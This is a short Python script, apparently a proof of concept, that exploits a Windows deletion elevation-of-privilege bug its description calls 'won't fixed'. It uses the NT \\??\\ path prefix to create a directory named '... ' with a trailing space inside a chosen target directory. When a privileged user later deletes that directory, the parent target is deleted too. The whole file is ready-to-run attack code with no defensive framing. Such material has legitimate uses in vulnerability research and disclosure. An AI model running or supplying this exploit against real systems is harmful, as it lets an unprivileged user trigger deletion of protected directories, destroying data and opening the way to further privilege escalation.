import argparse
import os


def parse_args():
    parser = argparse.ArgumentParser(description="Exploits a \"won't fixed\" deletion EoP vulnerability triggered by a privileged user interaction. Creates a directory called \"... \" in a target directory to delete. When \"... \" is deleted, then its parent directory is deleted too.")
    parser.add_argument("target_dir", type=str, help="The target directory to try to delete. It is vulnerable only if you can create a directory inside it.")
    return parser.parse_args()


def main():
    args = parse_args()
    target_dir_abs_path = os.path.abspath(args.target_dir)
    os.mkdir(f"\\??\\{target_dir_abs_path}\\... ")
    open(f"\\??\\{target_dir_abs_path}\\... \\temp", "wb").close()



if "__main__" == __name__:
    main()